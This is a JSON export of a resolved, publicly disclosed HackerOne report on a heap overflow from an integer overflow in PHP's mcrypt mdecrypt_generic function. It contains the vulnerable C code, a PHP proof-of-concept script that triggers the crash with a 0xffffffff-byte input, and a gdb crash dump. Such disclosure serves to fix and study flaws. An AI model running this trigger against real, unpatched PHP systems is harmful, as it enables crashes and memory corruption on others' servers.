{
  "id": 146360,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDYzNjA=",
  "url": "https://hackerone.com/reports/146360",
  "title": "Heap Overflow Due To Integer Overflow",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-06-22T02:41:10.357Z",
  "submitted_at": "2016-06-22T02:41:10.357Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hoangnguyen",
    "url": "/hoangnguyen",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/688/42c5ca5265ff965283d70fc52df2681dfd648d44_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGYXUPS3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwIAvmOv4w%2B4UievyIjT9W9diCvrH4kfNWO8qEFYjlbwIhAPbbzN5sQ7g06VPALW0LiObnUDpFUEodUMbivgwErLB0KrEFCBYQAxoMMDEzNjE5Mjc0ODQ5IgxalQrWOaLbompCcQgqjgUsqIBUylMwN%2FnNcfkbd64VhlDbnlyGMHDkw3isEnWxpoUHAeIOkeS6Q9l6cDuV7hhXpBymFhcb9bp65SbsEb7j98UfZu4UmfsHSwazwJyYIhnhfgjxXae51nWR9j3nYOpjDvG5k1Z%2BUgTSry5AY7bqJDJ1lWdEVFGVX%2Ba%2FtIjSbYCLHEire8lIKDNWL6nt%2B5CTtVm4XoFurIkG3iVgu3SOQ5ayHYFUjHGngk3B3U2SoCdndOSOjV%2Bbls687WQGR9Pa317h7gMbugxjuDIfMVRWBZQxBALZjCaFDaPZO05HWfjOJ8y6dUfGp6LX860xVsfabVldWzhM5tRm%2Fwinjszwx7T4IIfeAYukeg7c0Bc%2BSDSy8gdeuoV20%2BO7CKjMId6Rpoka2bDT8w1dDlpCy5EOX%2BjRgsrNOpt7kPGOMQxpW%2FxSYtqBUGOnL9cw6TyDOmLYbN2rzxar7NNd3ecl9KLUQ277w0fC3vFZYIjjQRfA9%2BFLH6YLp%2FRAhwgaOMfW4icNf%2BXRitp8iHE9SgZmbxBzLzEGLFr%2BIdAmJfu5GzzLISD3ZuCCXMnLwz0H3frzCqmb0MGTA2Iv%2F9xDIkSVPugL3KZf9WVEwNWwxEwxMnrEC7BIqSOkc%2FPszAyKc43gTM%2B9RqHNGeTSOnDSkCqRtwV%2Bw0GXqn5KZM6jGmyxrxyJj3yZSXuAsO%2FQmFP%2BzaIgCFbyrO2fwfqjiHz1vdAJYhxj1WQ82bYxKcy4oqVfJQayQPtgExd%2Fqd85OauFvgP8O772S3BaZk4HTeXrqYnFOdOrKKfGhAAiVYRTXu%2BmQE9XBaqqQQAdy6Lfgr4mnpHWTUyr9ptoeBISbybyedw94rimQH1Cog6coBkwnn5Govcwieq%2FxgY6sAFc%2BfO0t7klqfy2jQRzyBYAzxL%2FknTvvj9qQ7OaUQN%2FwGNJ91rcj9Kjb%2BvgcRNykkQY3pQGfR5JAxgu7wxAAFzb9U91Zk7tW0XgwBUxmWGDHfNtxWtiTjpu0VqoJ8GlvaGjrC1Kr%2FrUjjDaRUPnXlRJdc3GcrRkEsXSFYvhoIyQslvMw%2B6r3SE%2BcWQqNXj0Org1zsR3g6v0jhhMCmVoKVJJroMdzQZFLaTLnS23pytPpA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=057e00baf91e4d7550f7841beec41ac9e964125aaef0daec9ca907e13b06ee65",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGYXUPS3%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwIAvmOv4w%2B4UievyIjT9W9diCvrH4kfNWO8qEFYjlbwIhAPbbzN5sQ7g06VPALW0LiObnUDpFUEodUMbivgwErLB0KrEFCBYQAxoMMDEzNjE5Mjc0ODQ5IgxalQrWOaLbompCcQgqjgUsqIBUylMwN%2FnNcfkbd64VhlDbnlyGMHDkw3isEnWxpoUHAeIOkeS6Q9l6cDuV7hhXpBymFhcb9bp65SbsEb7j98UfZu4UmfsHSwazwJyYIhnhfgjxXae51nWR9j3nYOpjDvG5k1Z%2BUgTSry5AY7bqJDJ1lWdEVFGVX%2Ba%2FtIjSbYCLHEire8lIKDNWL6nt%2B5CTtVm4XoFurIkG3iVgu3SOQ5ayHYFUjHGngk3B3U2SoCdndOSOjV%2Bbls687WQGR9Pa317h7gMbugxjuDIfMVRWBZQxBALZjCaFDaPZO05HWfjOJ8y6dUfGp6LX860xVsfabVldWzhM5tRm%2Fwinjszwx7T4IIfeAYukeg7c0Bc%2BSDSy8gdeuoV20%2BO7CKjMId6Rpoka2bDT8w1dDlpCy5EOX%2BjRgsrNOpt7kPGOMQxpW%2FxSYtqBUGOnL9cw6TyDOmLYbN2rzxar7NNd3ecl9KLUQ277w0fC3vFZYIjjQRfA9%2BFLH6YLp%2FRAhwgaOMfW4icNf%2BXRitp8iHE9SgZmbxBzLzEGLFr%2BIdAmJfu5GzzLISD3ZuCCXMnLwz0H3frzCqmb0MGTA2Iv%2F9xDIkSVPugL3KZf9WVEwNWwxEwxMnrEC7BIqSOkc%2FPszAyKc43gTM%2B9RqHNGeTSOnDSkCqRtwV%2Bw0GXqn5KZM6jGmyxrxyJj3yZSXuAsO%2FQmFP%2BzaIgCFbyrO2fwfqjiHz1vdAJYhxj1WQ82bYxKcy4oqVfJQayQPtgExd%2Fqd85OauFvgP8O772S3BaZk4HTeXrqYnFOdOrKKfGhAAiVYRTXu%2BmQE9XBaqqQQAdy6Lfgr4mnpHWTUyr9ptoeBISbybyedw94rimQH1Cog6coBkwnn5Govcwieq%2FxgY6sAFc%2BfO0t7klqfy2jQRzyBYAzxL%2FknTvvj9qQ7OaUQN%2FwGNJ91rcj9Kjb%2BvgcRNykkQY3pQGfR5JAxgu7wxAAFzb9U91Zk7tW0XgwBUxmWGDHfNtxWtiTjpu0VqoJ8GlvaGjrC1Kr%2FrUjjDaRUPnXlRJdc3GcrRkEsXSFYvhoIyQslvMw%2B6r3SE%2BcWQqNXj0Org1zsR3g6v0jhhMCmVoKVJJroMdzQZFLaTLnS23pytPpA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aa9e33f4956cbfd469497872b6539141f549e1748e50d69b584cbdd5e048ced1"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:35:35.784Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:35:08.218Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Bug reported : https://bugs.php.net/bug.php?id=72455\n\n```\nPHP_FUNCTION(mdecrypt_generic)\n{\n    **** snip***\n    int block_size, data_size; // signed int\n    /* Check blocksize */\n    if (mcrypt_enc_is_block_mode(pm->td) == 1) { /* It's a block algorithm */\n\t\tblock_size = mcrypt_enc_get_block_size(pm->td);\n\t\tdata_size = ((((int)data_len - 1) / block_size) + 1) * block_size;\n\t\tdata_s = emalloc(data_size + 1);\n\t\tmemset(data_s, 0, data_size);\n\t\tmemcpy(data_s, data, data_len);\n\n    } else { /* It's not a block algorithm */\n\t\tdata_size = (int)data_len;\n\t\tdata_s = emalloc(data_size + 1);\n\t\tmemset(data_s, 0, data_size);\n\t\tmemcpy(data_s, data, data_len);\n\t}\n```\n\nAs you can see data_size follow by formular : data_size = ((((int)data_len - 1) / block_size) + 1) * block_size; because data_size is int. If attacker control data_len for example data_len = 0xffffffff then data_size = 0x20, after that, they will emalloc(0x20) bytes and then use memcpy data to data_s with data_len is 0xffffffff in unsigned int is 4294967295, this leads to heap overflow.\n\nAnother code block that lead to integer overflow when check encrypt data is not a block cipher. They just cast data_len from unsigned int to signed int ```data_size = (int)data_len;```, if attacker control data_len = 0xffffffff (in signed int is -1) so that data_size+1 is 0 and pass this value to emalloc, after that they use data_len (is unsigned integer is 4294967295) to copy n bytes data to data_s, this leads to heap overflow again.\n\nTest Script:\n```\n<?php\n\t/* Data */\n\tini_set('memory_limit',-1);\n\n\t$key = str_repeat('C', 32);\n\t$str = str_repeat('A', 0xffffffff);\n\n\t// $td = mcrypt_module_open('des', '', 'ecb', '');\n\t$td = mcrypt_module_open(MCRYPT_RIJNDAEL_256, '', 'cbc', ''); // block cipher (case 1)\n\t// $td = mcrypt_module_open('rijndael-256', '', 'ofb', ''); // not block cipher (case 2)\n\n\t$ks = mcrypt_enc_get_key_size($td);\n\n\t$iv = str_repeat('D', 32);\n\n\tif (mcrypt_generic_init($td, $key, $iv) != -1) {\n\t\tmcrypt_generic_init($td, $key, $iv);\n\t\t$p_t = mdecrypt_generic($td, $str);\n\n\t\tmcrypt_generic_deinit($td);\n\t\tmcrypt_module_close($td);\n\t}\n?>\n```\n\nCrash:\n```\ngdb-peda$ r test.php\nStarting program: /media/Data/Build/audit/php7.0.7 test.php\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff427c320 --> 0x0\nRBX: 0x0\nRCX: 0x8000f427c310\nRDX: 0xffe7c2d0\nRSI: 0x7ffef3d83d38 ('A' <repeats 200 times>...)\nRDI: 0x7ffff43fffc0 ('A' <repeats 64 times><error: Cannot access memory at address 0x7ffff4400000>)\nRBP: 0x7fffffffaf50 --> 0x7fffffffaf80 --> 0x7fffffffafb0 --> 0x7fffffffaff0 --> 0x7fffffffb100 --> 0x7fffffffd400 --> 0x7fffffffe780 --> 0x7fffffffe8d0 --> 0x9a0b00 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffaee8 --> 0x64e590 (<zif_mdecrypt_generic+401>:\tjmp    0x64e5f2 <zif_mdecrypt_generic+499>)\nRIP: 0x7ffff6c2ba0e (<__memcpy_avx_unaligned+830>:\tvmovntdq YMMWORD PTR [rdi+0x40],ymm2)\nR8 : 0x7ffff427c320 --> 0x0\nR9 : 0x0\nR10: 0x20 (' ')\nR11: 0x7ffff77746e0 (<mcrypt_enc_get_block_size>:\tmov    rax,QWORD PTR [rdi+0xc8])\nR12: 0x424690 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffe9b0 --> 0x2\nR14: 0x7ffff4214030 --> 0x7ffff427f5c0 ('A' <repeats 200 times>...)\nR15: 0x7ffff427f5c0 ('A' <repeats 200 times>...)\nEFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff6c2ba01 <__memcpy_avx_unaligned+817>:\tsub    rsi,0xffffffffffffff80\n   0x7ffff6c2ba05 <__memcpy_avx_unaligned+821>:\tvmovntdq YMMWORD PTR [rdi],ymm0\n   0x7ffff6c2ba09 <__memcpy_avx_unaligned+825>:\tvmovntdq YMMWORD PTR [rdi+0x20],ymm1\n=> 0x7ffff6c2ba0e <__memcpy_avx_unaligned+830>:\tvmovntdq YMMWORD PTR [rdi+0x40],ymm2\n   0x7ffff6c2ba13 <__memcpy_avx_unaligned+835>:\tvmovntdq YMMWORD PTR [rdi+0x60],ymm3\n   0x7ffff6c2ba18 <__memcpy_avx_unaligned+840>:\tsub    rdi,0xffffffffffffff80\n   0x7ffff6c2ba1c <__memcpy_avx_unaligned+844>:\tadd    rdx,0xffffffffffffff80\n   0x7ffff6c2ba20 <__memcpy_avx_unaligned+848>:\tjb     0x7ffff6c2b9e0 <__memcpy_avx_unaligned+784>\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaee8 --> 0x64e590 (<zif_mdecrypt_generic+401>:\tjmp    0x64e5f2 <zif_mdecrypt_generic+499>)\n0008| 0x7fffffffaef0 --> 0x7ffff42141e0 --> 0x0\n0016| 0x7fffffffaef8 --> 0x7ffff4214220 --> 0x0\n0024| 0x7fffffffaf00 --> 0xfffffda9000000e2\n0032| 0x7fffffffaf08 --> 0x2000000020 (' ')\n0040| 0x7fffffffaf10 --> 0x7ffff4214280 --> 0x7ffff42010e0 --> 0x900000002\n0048| 0x7fffffffaf18 --> 0x7ffef3c00018 ('A' <repeats 200 times>...)\n0056| 0x7fffffffaf20 --> 0xfffffff0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n__memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272\n272\t../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S: No such file or directory.\ngdb-peda$ bt\n#0  __memcpy_avx_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S:272\n#1  0x000000000064e590 in zif_mdecrypt_generic (execute_data=0x7ffff4214220, return_value=0x7ffff42141e0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/ext/mcrypt/mcrypt.c:688\n#2  0x000000000092cb3e in ZEND_DO_ICALL_SPEC_HANDLER () at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:586\n#3  0x000000000092c56a in execute_ex (ex=0x7ffff4214030) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:414\n#4  0x000000000092c67b in zend_execute (op_array=0x7ffff427e000, return_value=0x0) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend_vm_execute.h:458\n#5  0x00000000008cd94a in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/Zend/zend.c:1427\n#6  0x00000000008362ea in php_execute_script (primary_file=0x7fffffffd630) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/main/main.c:2494\n#7  0x0000000000995591 in do_cli (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:974\n#8  0x000000000099675f in main (argc=0x2, argv=0x115d440) at /home/hoangnguyen/Data/Build/audit/php-7.0.7/sapi/cli/php_cli.c:1344\n#9  0x00007ffff6afe830 in __libc_start_main (main=0x995f54 <main>, argc=0x2, argv=0x7fffffffe9b8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>,\n    stack_end=0x7fffffffe9a8) at ../csu/libc-start.c:291\n#10 0x00000000004246b9 in _start ()\n```",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:35:08.303Z",
  "allow_singular_disclosure_after": -184910364.66826218,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "ndizon_",
    "dyabla"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
